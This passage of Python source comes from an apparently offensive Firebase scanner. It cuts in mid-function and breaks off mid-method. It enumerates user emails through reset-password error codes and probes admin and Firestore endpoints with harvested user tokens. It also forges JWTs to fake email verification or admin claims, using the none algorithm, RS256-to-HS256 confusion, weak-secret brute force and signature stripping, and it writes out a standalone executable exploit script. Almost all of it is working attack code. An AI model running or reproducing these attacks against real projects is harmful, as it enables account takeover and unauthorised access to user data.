                        if 'EMAIL_NOT_FOUND' in error_msg:
                            # Email doesn't exist
                            continue
                        elif 'RESET_PASSWORD_EXCEED_LIMIT' in error_msg:
                            # Email exists but reset limit exceeded
                            users.append({
                                'extraction_method': 'email_enumeration',
                                'email': email,
                                'exists': True,
                                'status': 'reset_limit_exceeded',
                                'verification_method': 'rate_limit_indicator'
                            })
                            print(f"{Colors.GREEN}[+] Found: {email} (rate limited){Colors.ENDC}")
                        elif 'TOO_MANY_ATTEMPTS_TRY_LATER' in error_msg:
                            print(f"{Colors.WARNING}[!] Rate limited, pausing...{Colors.ENDC}")
                            time.sleep(5)
                            continue
                            
                except Exception as e:
                    continue
                    
                # Small delay to avoid rate limiting
                time.sleep(0.3)
            
            return users

    def _test_privilege_escalation(self, api_key: str) -> None:
        """Test for privilege escalation possibilities"""
        print(f"\n{Colors.CYAN}[*] Testing Privilege Escalation{Colors.ENDC}")
        
        # Load user tokens
        import glob
        token_files = glob.glob("firebase_*.json")
        
        if not token_files:
            print(f"{Colors.WARNING}[!] No user tokens available for testing{Colors.ENDC}")
            return
        
        # Test various admin endpoints
        admin_endpoints = [
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:batchGet?key={api_key}",
            f"https://identitytoolkit.googleapis.com/v1/projects/{self.project_id}/accounts:query?key={api_key}",
            f"https://firebase.googleapis.com/v1/projects/{self.project_id}?key={api_key}",
            f"https://firebase.googleapis.com/v1beta1/projects/{self.project_id}/adminSdkConfig?key={api_key}"
        ]
        
        for token_file in token_files[:3]:  # Test with first 3 users
            try:
                with open(token_file, 'r') as f:
                    user_data = json.load(f)
                
                id_token = user_data.get('id_token', '')
                email = user_data.get('email', 'Unknown')
                
                if not id_token:
                    continue
                
                print(f"\n{Colors.CYAN}[*] Testing escalation for: {email}{Colors.ENDC}")
                
                # Test admin endpoints
                for endpoint in admin_endpoints:
                    try:
                        headers = {'Authorization': f'Bearer {id_token}'}
                        response = self.session.get(endpoint, headers=headers, timeout=5)
                        
                        if response.status_code == 200:
                            print(f"{Colors.FAIL}[!] CRITICAL: Admin access possible!{Colors.ENDC}")
                            print(f"    Endpoint: {endpoint}")
                            print(f"    Response: {response.text[:200]}...")
                        elif response.status_code == 403:
                            print(f"{Colors.GREEN}[✓] Properly restricted: {endpoint.split('/')[-1]}{Colors.ENDC}")
                        else:
                            print(f"{Colors.WARNING}[?] Unexpected response {response.status_code}: {endpoint.split('/')[-1]}{Colors.ENDC}")
                            
                    except Exception as e:
                        continue
                
                # Test Firebase Admin SDK endpoints
                admin_sdk_endpoints = [
                    f"https://firebase.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents",
                    f"https://firestore.googleapis.com/v1/projects/{self.project_id}/databases/(default)/documents"
                ]
                
                for endpoint in admin_sdk_endpoints:
                    try:
                        headers = {'Authorization': f'Bearer {id_token}'}
                        response = self.session.get(endpoint, headers=headers, timeout=5)
                        
                        if response.status_code == 200:
                            print(f"{Colors.FAIL}[!] HIGH: Database admin access possible!{Colors.ENDC}")
                            print(f"    Endpoint: {endpoint}")
                            
                    except Exception:
                        continue
                        
            except Exception as e:
                continue

    def _generate_jwt_exploit_script(self, successful_attacks: List[Dict], analysis: Dict) -> None:
        """Generate JWT exploitation script"""
        print(f"\n{Colors.CYAN}[*] Generating JWT Exploitation Script{Colors.ENDC}")
        
        script_content = f'''#!/usr/bin/env python3
"""
Firebase JWT Exploitation Script
Generated by Firebase Scanner Enhanced
Target: {self.project_id}
"""

import base64
import json
import hmac
import hashlib
import requests
import sys

class FirebaseJWTExploit:
    def __init__(self, api_key):
        self.api_key = api_key
        self.session = requests.Session()
    
    def manipulate_jwt_email_verification(self, original_token):
        """Main JWT manipulation for email verification bypass"""
        try:
            # Parse original token
            parts = original_token.split('.')
            if len(parts) != 3:
                return None
            
            # Decode payload
            payload_padding = '=' * (4 - len(parts[1]) % 4)
            payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
            payload = json.loads(payload_data)
            
            print(f"[*] Original email_verified: {{payload.get('email_verified', False)}}")
'''
        
        # Add specific attack methods based on successful attacks
        for attack in successful_attacks:
            attack_name = attack['attack'].lower().replace(' ', '_')
            
            if 'algorithm confusion' in attack_name:
                script_content += '''
    def algorithm_confusion_attack(self, token):
        """Algorithm Confusion Attack: RS256 -> HS256"""
        parts = token.split('.')
        
        # Decode header and payload
        header_padding = '=' * (4 - len(parts[0]) % 4)
        header_data = base64.urlsafe_b64decode(parts[0] + header_padding)
        header = json.loads(header_data)
        
        payload_padding = '=' * (4 - len(parts[1]) % 4)
        payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
        payload = json.loads(payload_data)
        
        # Modify header algorithm
        header['alg'] = 'HS256'
        payload['email_verified'] = True
        
        # Get Firebase public key
        public_key = self.get_firebase_public_key(header.get('kid'))
        if not public_key:
            return None
            
        return self.create_hmac_token(header, payload, public_key)
'''
            
            elif 'none algorithm' in attack_name:
                script_content += '''
    def none_algorithm_attack(self, token):
        """None Algorithm Attack"""
        parts = token.split('.')
        
        # Decode and modify
        header_padding = '=' * (4 - len(parts[0]) % 4)
        header_data = base64.urlsafe_b64decode(parts[0] + header_padding)
        header = json.loads(header_data)
        
        payload_padding = '=' * (4 - len(parts[1]) % 4)
        payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
        payload = json.loads(payload_data)
        
        # Modify to none algorithm
        header['alg'] = 'none'
        payload['email_verified'] = True
        
        # Create token with no signature
        header_encoded = base64.urlsafe_b64encode(
            json.dumps(header, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        return f"{header_encoded}.{payload_encoded}."
'''
            
            elif 'weak secret' in attack_name:
                script_content += f'''
    def weak_secret_attack(self, token):
        """Weak Secret Bruteforce Attack"""
        # Try the discovered weak secret: {attack['result'].get('secret', 'unknown')}
        weak_secret = "{attack['result'].get('secret', 'secret')}"
        
        parts = token.split('.')
        header_payload = f"{{parts[0]}}.{{parts[1]}}"
        
        # Decode payload and modify
        payload_padding = '=' * (4 - len(parts[1]) % 4)
        payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
        payload = json.loads(payload_data)
        payload['email_verified'] = True
        
        # Re-encode payload
        payload_encoded = base64.urlsafe_b64encode(
            json.dumps(payload, separators=(',', ':')).encode()
        ).decode().rstrip('=')
        
        # Create new signature
        new_message = f"{{parts[0]}}.{{payload_encoded}}"
        signature = hmac.new(
            weak_secret.encode(),
            new_message.encode(),
            hashlib.sha256
        ).digest()
        
        signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        return f"{{parts[0]}}.{{payload_encoded}}.{{signature_encoded}}"
'''

        script_content += '''
    def get_firebase_public_key(self, key_id):
        """Get Firebase public key for algorithm confusion"""
        try:
            keys_url = "https://www.googleapis.com/robot/v1/metadata/x509/securetoken@system.gserviceaccount.com"
            response = self.session.get(keys_url, timeout=10)
            
            if response.status_code == 200:
                keys = response.json()
                return keys.get(key_id, '')
            
        except:
            pass
        return None
    
    def create_hmac_token(self, header, payload, secret):
        """Create HMAC-signed token"""
        try:
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            message = f"{header_encoded}.{payload_encoded}"
            signature = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            
            signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            return f"{header_encoded}.{payload_encoded}.{signature_encoded}"
            
        except Exception as e:
            print(f"Error creating HMAC token: {e}")
            return None
    
    def test_token(self, token):
        """Test if manipulated token works"""
        try:
            lookup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={self.api_key}"
            
            response = self.session.post(
                lookup_endpoint,
                json={"idToken": token},
                timeout=10
            )
            
            if response.status_code == 200:
                user_data = response.json()
                users = user_data.get('users', [])
                
                if users:
                    user = users[0]
                    print(f"[+] Token accepted!")
                    print(f"    Email: {user.get('email', 'Unknown')}")
                    print(f"    Email Verified: {user.get('emailVerified', False)}")
                    print(f"    User ID: {user.get('localId', 'Unknown')}")
                    
                    if user.get('emailVerified'):
                        print("🚨 EMAIL VERIFICATION BYPASS SUCCESSFUL! 🚨")
                        return True
            else:
                print(f"[-] Token rejected: {response.status_code}")
                
        except Exception as e:
            print(f"Error testing token: {e}")
            
        return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 jwt_exploit.py <original_token> <api_key>")
        print("       python3 jwt_exploit.py <original_token> <api_key> <attack_method>")
        print("")
        print("Attack methods:")'''
        
        # Add attack methods to usage
        for attack in successful_attacks:
            method_name = attack['attack'].lower().replace(' ', '_').replace('-', '_')
            script_content += f'''
        print("  {method_name}")'''
        
        script_content += '''
        return
    
    original_token = sys.argv[1]
    api_key = sys.argv[2]
    attack_method = sys.argv[3] if len(sys.argv) > 3 else None
    
    exploit = FirebaseJWTExploit(api_key)
    
    print("Firebase JWT Exploitation Tool")
    print("=" * 40)
    print(f"Target token: {original_token[:50]}...")
    print("")
    
    # Try all available attacks or specific one
    attacks_to_try = []
    '''
        
        # Add attack method calls
        for attack in successful_attacks:
            method_name = attack['attack'].lower().replace(' ', '_').replace('-', '_')
            script_content += f'''
    if not attack_method or attack_method == "{method_name}":
        attacks_to_try.append(("{attack['attack']}", exploit.{method_name}))'''
        
        script_content += '''
    
    success = False
    for attack_name, attack_func in attacks_to_try:
        print(f"[*] Trying {attack_name}...")
        
        try:
            manipulated_token = attack_func(original_token)
            
            if manipulated_token:
                print(f"[+] Generated manipulated token")
                print(f"    Token: {manipulated_token[:50]}...")
                
                if exploit.test_token(manipulated_token):
                    print(f"[+] SUCCESS: {attack_name} worked!")
                    
                    # Save successful token
                    with open(f"successful_jwt_{int(time.time())}.txt", "w") as f:
                        f.write(f"Attack: {attack_name}\\n")
                        f.write(f"Original: {original_token}\\n")
                        f.write(f"Manipulated: {manipulated_token}\\n")
                    
                    success = True
                    break
                else:
                    print(f"[-] Token generated but not accepted")
            else:
                print(f"[-] Could not generate token for {attack_name}")
                
        except Exception as e:
            print(f"[!] Error in {attack_name}: {e}")
    
    if not success:
        print("[-] No JWT attacks were successful")
    
if __name__ == "__main__":
    main()
'''
        
        # Save the script
        timestamp = int(time.time())
        script_filename = f"firebase_jwt_exploit_{timestamp}.py"
        
        try:
            with open(script_filename, 'w') as f:
                f.write(script_content)
            
            # Make executable
            import stat
            st = os.stat(script_filename)
            os.chmod(script_filename, st.st_mode | stat.S_IEXEC)
            
            print(f"{Colors.GREEN}[✓] JWT exploitation script generated: {script_filename}{Colors.ENDC}")
            print(f"\n{Colors.CYAN}Usage examples:{Colors.ENDC}")
            print(f"  python3 {script_filename} <your_jwt_token> <api_key>")
            print(f"  python3 {script_filename} <your_jwt_token> <api_key> none_algorithm_attack")
            
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error generating JWT script: {e}{Colors.ENDC}")

    def _display_jwt_attack_summary(self, successful_attacks: List[Dict], original_token: str, analysis: Dict) -> None:
        """Display summary of JWT attacks"""
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║           JWT ATTACK SUMMARY             ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        if not successful_attacks:
            print(f"\n{Colors.GREEN}[✓] No JWT vulnerabilities found - Token appears secure{Colors.ENDC}")
            return
        
        print(f"\n{Colors.FAIL}🚨 JWT VULNERABILITIES FOUND! 🚨{Colors.ENDC}")
        print(f"Successful attacks: {len(successful_attacks)}")
        
        for attack in successful_attacks:
            print(f"\n{Colors.FAIL}[+] {attack['attack']}{Colors.ENDC}")
            print(f"    Details: {attack['result'].get('details', 'No details')}")
            
            if attack['result'].get('manipulated_token'):
                token_preview = attack['result']['manipulated_token'][:50] + '...'
                print(f"    Token: {token_preview}")
        
        # Save JWT attack results
        timestamp = int(time.time())
        results_file = f"jwt_attacks_{timestamp}.json"
        
        results_data = {
            'timestamp': timestamp,
            'original_token_analysis': analysis,
            'successful_attacks': successful_attacks,
            'total_attacks_tested': len(successful_attacks) + 5,  # Approximate
            'recommendations': [
                'Use RS256 algorithm with proper key management',
                'Implement proper signature verification',
                'Validate all JWT claims server-side',
                'Use short token lifetimes',
                'Implement token blacklisting'
            ]
        }
        
        with open(results_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        
        print(f"\n{Colors.GREEN}[✓] JWT attack results saved to: {results_file}{Colors.ENDC}")
        
        # Generate exploitation script for successful attacks
        if successful_attacks:
            self._generate_jwt_exploit_script(successful_attacks, analysis)

    def _test_manipulated_token(self, token: str, api_key: str) -> None:
        """Test what can be done with manipulated token"""
        print(f"\n{Colors.CYAN}[*] Testing Manipulated Token Capabilities{Colors.ENDC}")
        
        # Test profile access
        try:
            lookup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}"
            response = self.session.post(lookup_endpoint, json={"idToken": token}, timeout=5)
            
            if response.status_code == 200:
                user_data = response.json()
                users = user_data.get('users', [])
                
                if users:
                    user = users[0]
                    print(f"{Colors.GREEN}[+] Token accepted! User profile accessible:{Colors.ENDC}")
                    print(f"    Email: {user.get('email', 'Unknown')}")
                    print(f"    Email Verified: {user.get('emailVerified', False)}")
                    print(f"    User ID: {user.get('localId', 'Unknown')}")
                    
                    if user.get('emailVerified'):
                        print(f"{Colors.FAIL}🚨 EMAIL VERIFICATION BYPASS SUCCESSFUL! 🚨{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[-] Token rejected: {response.status_code}{Colors.ENDC}")
                
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error testing token: {e}{Colors.ENDC}")

    def _quick_token_test(self, token: str, api_key: str) -> bool:
        """Quick test to see if manipulated token is accepted"""
        try:
            lookup_endpoint = f"https://identitytoolkit.googleapis.com/v1/accounts:lookup?key={api_key}"
            
            response = self.session.post(
                lookup_endpoint,
                json={"idToken": token},
                timeout=5
            )
            
            return response.status_code == 200
            
        except Exception as e:
            return False

    def _get_firebase_public_key(self, key_id: str) -> Optional[str]:
        """Attempt to retrieve Firebase public key"""
        try:
            # Firebase public keys endpoint
            keys_url = "https://www.googleapis.com/robot/v1/metadata/x509/securetoken@system.gserviceaccount.com"
            response = self.session.get(keys_url, timeout=10)
            
            if response.status_code == 200:
                keys = response.json()
                return keys.get(key_id)
            
        except Exception as e:
            pass
        
        return None

    def _test_weak_secret_bruteforce(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test weak secret bruteforce for HMAC tokens"""
        if not analysis['algorithm'].startswith('HS'):
            return {'success': False, 'error': 'Not an HMAC token'}
        
        try:
            import base64
            import json
            import hmac
            import hashlib
            
            # Common weak secrets to try
            weak_secrets = [
                'secret', 'password', '123456', 'firebase', 'key',
                self.project_id, f'{self.project_id}_secret', 
                'firebase_secret', 'jwt_secret', 'your_secret_key',
                '', 'null', 'undefined', 'secret123', 'password123',
                analysis.get('key_id', ''), analysis.get('issuer', '').split('/')[-1]
            ]
            
            # Get the signing input
            header_payload = f"{analysis['raw_parts'][0]}.{analysis['raw_parts'][1]}"
            original_signature = base64.urlsafe_b64decode(
                analysis['raw_parts'][2] + '=' * (4 - len(analysis['raw_parts'][2]) % 4)
            )
            
            # Try each weak secret
            for secret in weak_secrets:
                try:
                    if analysis['algorithm'] == 'HS256':
                        calculated_sig = hmac.new(
                            secret.encode(),
                            header_payload.encode(),
                            hashlib.sha256
                        ).digest()
                    elif analysis['algorithm'] == 'HS512':
                        calculated_sig = hmac.new(
                            secret.encode(),
                            header_payload.encode(),
                            hashlib.sha512
                        ).digest()
                    else:
                        continue
                    
                    if calculated_sig == original_signature:
                        # Found the secret! Now create manipulated token
                        modified_payload = analysis['payload'].copy()
                        modified_payload['email_verified'] = True
                        
                        payload_encoded = base64.urlsafe_b64encode(
                            json.dumps(modified_payload, separators=(',', ':')).encode()
                        ).decode().rstrip('=')
                        
                        new_message = f"{analysis['raw_parts'][0]}.{payload_encoded}"
                        new_signature = hmac.new(
                            secret.encode(),
                            new_message.encode(),
                            hashlib.sha256 if analysis['algorithm'] == 'HS256' else hashlib.sha512
                        ).digest()
                        
                        new_signature_encoded = base64.urlsafe_b64encode(new_signature).decode().rstrip('=')
                        manipulated_token = f"{analysis['raw_parts'][0]}.{payload_encoded}.{new_signature_encoded}"
                        
                        return {
                            'success': True,
                            'details': f'Weak secret found: "{secret}"',
                            'manipulated_token': manipulated_token,
                            'secret': secret,
                            'algorithm': analysis['algorithm']
                        }
                        
                except Exception as e:
                    continue
            
            return {'success': False, 'error': 'No weak secrets found'}
            
        except Exception as e:
            return {'success': False, 'error': f'Weak secret bruteforce failed: {e}'}

    def _test_direct_payload_modification(self, token: str, analysis: Dict, api_key: str) -> Dict:
        """Test direct payload modification without signature verification"""
        try:
            import base64
            import json
            
            # Create various payload modifications
            modifications = [
                # Basic email verification bypass
                {'email_verified': True},
                
                # Admin role injection
                {'email_verified': True, 'admin': True, 'role': 'admin'},
                
                # Custom claims injection
                {'email_verified': True, 'custom_claims': {'admin': True, 'verified': True}},
                
                # Firebase-specific claims
                {'email_verified': True, 'firebase': {'sign_in_provider': 'google.com'}},
                
                # Authority escalation
                {'email_verified': True, 'iss': f'https://securetoken.google.com/{self.project_id}', 'admin': True},
            ]
            
            successful_modifications = []
            
            for mod in modifications:
                try:
                    modified_payload = analysis['payload'].copy()
                    modified_payload.update(mod)
                    
                    payload_encoded = base64.urlsafe_b64encode(
                        json.dumps(modified_payload, separators=(',', ':')).encode()
                    ).decode().rstrip('=')
                    
                    # Try with original signature
                    manipulated_token = f"{analysis['raw_parts'][0]}.{payload_encoded}.{analysis['raw_parts'][2]}"
                    
                    # Quick test
                    if self._quick_token_test(manipulated_token, api_key):
                        successful_modifications.append({
                            'modification': mod,
                            'token': manipulated_token
                        })
                        
                except Exception as e:
                    continue
            
            if successful_modifications:
                return {
                    'success': True,
                    'details': f'Payload modification successful: {len(successful_modifications)} variants work',
                    'modifications': successful_modifications,
                    'manipulated_token': successful_modifications[0]['token']
                }
            else:
                return {'success': False, 'error': 'Payload modification did not work'}
                
        except Exception as e:
            return {'success': False, 'error': f'Payload modification failed: {e}'}

    def _test_claims_manipulation(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test direct claims manipulation with original signature"""
        try:
            import base64
            import json
            
            # Create multiple variations of manipulated claims
            manipulations = [
                {'email_verified': True},
                {'email_verified': True, 'admin': True},
                {'email_verified': True, 'role': 'admin'},
                {'verified': True, 'email_verified': True},
                {'email_verified': 'true'},  # String instead of boolean
                {'email_verified': 1},       # Number instead of boolean
            ]
            
            for manipulation in manipulations:
                modified_payload = analysis['payload'].copy()
                modified_payload.update(manipulation)
                
                payload_encoded = base64.urlsafe_b64encode(
                    json.dumps(modified_payload, separators=(',', ':')).encode()
                ).decode().rstrip('=')
                
                # Keep original header and signature
                manipulated_token = f"{analysis['raw_parts'][0]}.{payload_encoded}.{analysis['raw_parts'][2]}"
                
                # Test this token quickly
                test_result = self._quick_token_test(manipulated_token, api_key)
                if test_result:
                    return {
                        'success': True,
                        'details': f'Claims manipulation successful: {manipulation}',
                        'manipulated_token': manipulated_token,
                        'manipulation': manipulation
                    }
            
            return {'success': False, 'error': 'No claims manipulation succeeded'}
            
        except Exception as e:
            return {'success': False, 'error': f'Claims manipulation failed: {e}'}

    def _test_signature_stripping(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test signature stripping attack"""
        try:
            import base64
            import json
            
            # Try removing signature entirely
            parts = analysis['raw_parts']
            
            # Test 1: Empty signature
            modified_payload = analysis['payload'].copy()
            modified_payload['email_verified'] = True
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            # Try with empty signature
            manipulated_token = f"{parts[0]}.{payload_encoded}."
            
            return {
                'success': True,
                'details': 'Signature stripping - Empty signature',
                'manipulated_token': manipulated_token,
                'attack_type': 'signature_stripping'
            }
            
        except Exception as e:
            return {'success': False, 'error': f'Signature stripping failed: {e}'}

    def _test_none_algorithm(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test 'none' algorithm attack"""
        try:
            import base64
            import json
            
            # Modify header to use 'none' algorithm
            modified_header = analysis['header'].copy()
            modified_header['alg'] = 'none'
            
            # Modify payload to set email_verified = true
            modified_payload = analysis['payload'].copy()
            modified_payload['email_verified'] = True
            
            # Encode modified parts
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            # No signature for 'none' algorithm
            manipulated_token = f"{header_encoded}.{payload_encoded}."
            
            return {
                'success': True,
                'details': "Algorithm 'none' attack - No signature verification",
                'manipulated_token': manipulated_token,
                'attack_type': 'none_algorithm'
            }
            
        except Exception as e:
            return {'success': False, 'error': f'None algorithm attack failed: {e}'}

    def _test_algorithm_confusion(self, token: str, analysis: Dict, api_key: str, email: str) -> Dict:
        """Test algorithm confusion attacks (RS256 -> HS256)"""
        if analysis['algorithm'] != 'RS256':
            return {'success': False, 'error': 'Token not using RS256'}
        
        try:
            import base64
            import json
            import hmac
            import hashlib
            
            # Try to get Firebase's public key and use it as HMAC secret
            public_key = self._get_firebase_public_key(analysis.get('key_id'))
            if not public_key:
                return {'success': False, 'error': 'Could not retrieve public key'}
            
            # Modify header to use HS256
            modified_header = analysis['header'].copy()
            modified_header['alg'] = 'HS256'
            
            # Modify payload to set email_verified = true
            modified_payload = analysis['payload'].copy()
            modified_payload['email_verified'] = True
            
            # Encode modified parts
            header_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_header, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            payload_encoded = base64.urlsafe_b64encode(
                json.dumps(modified_payload, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            
            # Create signature using public key as HMAC secret
            message = f"{header_encoded}.{payload_encoded}"
            signature = hmac.new(
                public_key.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            
            signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            # Create manipulated token
            manipulated_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
            
            return {
                'success': True,
                'details': 'Algorithm confusion attack - RS256 -> HS256',
                'manipulated_token': manipulated_token,
                'original_algorithm': 'RS256',
                'new_algorithm': 'HS256'
            }
            
        except Exception as e:
            return {'success': False, 'error': f'Algorithm confusion failed: {e}'}

    def _display_jwt_analysis(self, analysis: Dict) -> None:
        """Display JWT analysis results"""
        if 'error' in analysis:
            print(f"{Colors.FAIL}[!] JWT Analysis Error: {analysis['error']}{Colors.ENDC}")
            return
        
        print(f"\n{Colors.CYAN}╔══════════════════════════════════════════╗")
        print(f"║              JWT ANALYSIS                ║")
        print(f"╚══════════════════════════════════════════╝{Colors.ENDC}")
        
        print(f"\n{Colors.YELLOW}Header:{Colors.ENDC}")
        for key, value in analysis['header'].items():
            print(f"  {key}: {value}")
        
        print(f"\n{Colors.YELLOW}Key Claims:{Colors.ENDC}")
        key_claims = ['email', 'email_verified', 'user_id', 'iss', 'aud', 'sub']
        for claim in key_claims:
            if claim in analysis:
                color = Colors.FAIL if claim == 'email_verified' and not analysis[claim] else Colors.WHITE
                print(f"  {color}{claim}: {analysis[claim]}{Colors.ENDC}")
        
        print(f"\n{Colors.YELLOW}Timing:{Colors.ENDC}")
        import datetime
        for time_claim in ['issued_at', 'expires_at', 'auth_time']:
            if analysis.get(time_claim):
                timestamp = analysis[time_claim]
                readable_time = datetime.datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
                print(f"  {time_claim}: {timestamp} ({readable_time})")
        
        print(f"\n{Colors.YELLOW}Security Analysis:{Colors.ENDC}")
        print(f"  Algorithm: {analysis['algorithm']}")
        print(f"  Key ID: {analysis['key_id']}")
        print(f"  Signature Length: {len(analysis['signature'])} chars")
        
        # Identify potential weaknesses
        weaknesses = []
        if analysis['algorithm'] == 'none':
            weaknesses.append("Algorithm 'none' - No signature verification!")
        if analysis['algorithm'].startswith('HS'):
            weaknesses.append("HMAC algorithm - Vulnerable to key confusion attacks")
        if not analysis['email_verified']:
            weaknesses.append("Email not verified - Primary target for manipulation")
        if analysis.get('expires_at', 0) - analysis.get('issued_at', 0) > 86400:
            weaknesses.append("Long token lifetime - Extended attack window")
        
        if weaknesses:
            print(f"\n{Colors.FAIL}Potential Weaknesses:{Colors.ENDC}")
            for weakness in weaknesses:
                print(f"  • {weakness}")

    def _analyze_jwt(self, token: str) -> Dict:
        """Analyze JWT structure and extract information"""
        import base64
        import json
        
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return {'error': 'Invalid JWT format'}
            
            # Decode header
            header_padding = '=' * (4 - len(parts[0]) % 4)
            header_data = base64.urlsafe_b64decode(parts[0] + header_padding)
            header = json.loads(header_data)
            
            # Decode payload
            payload_padding = '=' * (4 - len(parts[1]) % 4)
            payload_data = base64.urlsafe_b64decode(parts[1] + payload_padding)
            payload = json.loads(payload_data)
            
            # Signature (raw)
            signature = parts[2]
            
            return {
                'header': header,
                'payload': payload,
                'signature': signature,
                'raw_parts': parts,
                'algorithm': header.get('alg', 'Unknown'),
                'key_id': header.get('kid', 'Unknown'),
                'issuer': payload.get('iss', 'Unknown'),
                'audience': payload.get('aud', 'Unknown'),
                'subject': payload.get('sub', 'Unknown'),
                'email': payload.get('email', 'Unknown'),
                'email_verified': payload.get('email_verified', False),
                'user_id': payload.get('user_id', 'Unknown'),
                'issued_at': payload.get('iat', 0),
                'expires_at': payload.get('exp', 0),
                'auth_time': payload.get('auth_time', 0)
            }
            
        except Exception as e:
            return {'error': f'JWT analysis failed: {e}'}

    def _test_jwt_manipulation_bypass(self, api_key: str) -> None:
            """Advanced JWT manipulation for verification bypass"""
            print(f"\n{Colors.CYAN}[*] JWT Manipulation & Bypass Testing{Colors.ENDC}")
            
            test_email = input(f"{Colors.BOLD}[+] Enter test email (or press Enter for random): {Colors.ENDC}").strip()
            if not test_email:
                test_email = f"jwt_test_{int(time.time())}@evil.com"
            
            test_password = input(f"{Colors.BOLD}[+] Enter test password (default: JWTTest123!): {Colors.ENDC}").strip()
            if not test_password:
                test_password = "JWTTest123!"
            
            print(f"\n{Colors.CYAN}[*] Testing JWT manipulation for: {test_email}{Colors.ENDC}")
            
            # Create unverified user
            user_data = self._create_test_user(test_email, test_password, api_key)
            if not user_data:
                print(f"{Colors.FAIL}[!] Could not create test user{Colors.ENDC}")
                return
            
            original_token = user_data.get('idToken')
            email_verified = user_data.get('emailVerified', False)
            user_id = user_data.get('localId')
            
            print(f"{Colors.GREEN}[✓] Test user created{Colors.ENDC}")
            print(f"    Email: {test_email}")
            print(f"    User ID: {user_id}")
            print(f"    Email Verified: {email_verified}")
            print(f"    Original Token: {original_token[:50]}...")
            
            if email_verified:
                print(f"{Colors.WARNING}[!] Email is already verified - testing other JWT attacks{Colors.ENDC}")
            
            # Analyze the JWT
            jwt_analysis = self._analyze_jwt(original_token)
            self._display_jwt_analysis(jwt_analysis)
            
            # Test various JWT manipulation techniques
            jwt_attacks = [
                ("Algorithm Confusion Attack", self._test_algorithm_confusion),
                ("None Algorithm Attack", self._test_none_algorithm),
                ("Key Confusion Attack", self._test_key_confusion),
                ("Signature Stripping", self._test_signature_stripping),
                ("Claims Manipulation", self._test_claims_manipulation),
                ("Weak Secret Bruteforce", self._test_weak_secret_bruteforce),
                ("Public Key Recovery", self._test_public_key_recovery),
                ("Token Replay Attack", self._test_token_replay),
                ("Custom Claims Injection", self._test_custom_claims_injection)
            ]
            
            successful_attacks = []
            
            for attack_name, attack_func in jwt_attacks:
                try:
                    print(f"\n{Colors.CYAN}[*] Testing: {attack_name}{Colors.ENDC}")
                    result = attack_func(original_token, jwt_analysis, api_key, test_email)
                    
                    if result.get('success'):
                        print(f"{Colors.GREEN}[+] SUCCESS: {attack_name}{Colors.ENDC}")
                        print(f"    Details: {result.get('details', 'No details')}")
                        successful_attacks.append({
                            'attack': attack_name,
                            'result': result
                        })
                        
                        # Test the manipulated token
                        if result.get('manipulated_token'):
                            self._test_manipulated_token(result['manipulated_token'], api_key)
                    else:
                        print(f"{Colors.FAIL}[-] FAILED: {attack_name}{Colors.ENDC}")
                        if result.get('error'):
                            print(f"    Error: {result['error']}")
                            
                except Exception as e:
                    print(f"{Colors.FAIL}[!] ERROR in {attack_name}: {e}{Colors.ENDC}")
            
            # JWT-specific bypass techniques
            print(f"\n{Colors.CYAN}[*] Testing JWT-Specific Bypass Techniques{Colors.ENDC}")
            
            bypass_techniques = [
                ("Direct Payload Modification", self._test_direct_payload_modification),
                ("Header Parameter Injection", self._test_header_injection),
                ("Cross-JWT Confusion", self._test_cross_jwt_confusion),
                ("Time-based Attacks", self._test_time_based_attacks)
            ]
            
            for technique_name, technique_func in bypass_techniques:
                try:
                    print(f"\n{Colors.CYAN}[*] Testing: {technique_name}{Colors.ENDC}")
                    result = technique_func(original_token, jwt_analysis, api_key)
                    
                    if result.get('success'):
                        print(f"{Colors.GREEN}[+] SUCCESS: {technique_name}{Colors.ENDC}")
                        successful_attacks.append({
                            'attack': technique_name,
                            'result': result
                        })
                    else:
                        print(f"{Colors.FAIL}[-] FAILED: {technique_name}{Colors.ENDC}")
                        
                except Exception as e:
                    print(f"{Colors.FAIL}[!] ERROR in {technique_name}: {e}{Colors.ENDC}")
            
